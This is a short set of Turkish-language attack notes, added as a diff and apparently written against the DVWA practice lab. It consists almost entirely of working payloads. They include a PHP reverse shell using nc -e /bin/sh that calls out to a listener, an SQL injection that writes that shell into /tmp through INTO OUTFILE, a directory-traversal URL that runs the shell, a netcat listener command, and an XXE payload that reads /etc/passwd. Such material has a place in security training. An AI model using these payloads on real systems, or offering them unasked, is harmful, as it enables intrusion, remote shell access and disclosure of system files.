@@ -1,0 +1,24 @@
+SQL Açığı ile Shell Açmak
+<?passthru("nc 10.0.2.15 1234 -e /bin/sh");?>	-> php reverse shell kodu
+
+USER ID: 1' union select 1,'<?passthru("nc 10.0.2.15 1234 -e /bin/sh");?>' into outfile '/tmp/myshell.php'#	
+-> php dosyası oluşturduk. (çalışmazsa /sh yerine /bash kullan.)
+
+Oluşturmuş olduğumuz bu dosyaya Directory Traversal ile gidebiliriz.
+	nc -nvlp 1234
+http://10.0.2.5/dvwa/vulnerabilities/fi/?page=../../../../../tmp/myshell.php	-php dosyasını çalıştırdık.
+
+
+Site storage'indaki bazi tokenlara erisiminiz var ise bunu jwt.io gibi sitelerden encode edebilirsiniz.
+
+
+
+XXE Injection
+XML tabanlı uygulamalarda bulunan bir güvenlik açığıdır.
+.xml uzantili dosyalarin yuklenilebilirligi
+
+payload.xml:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
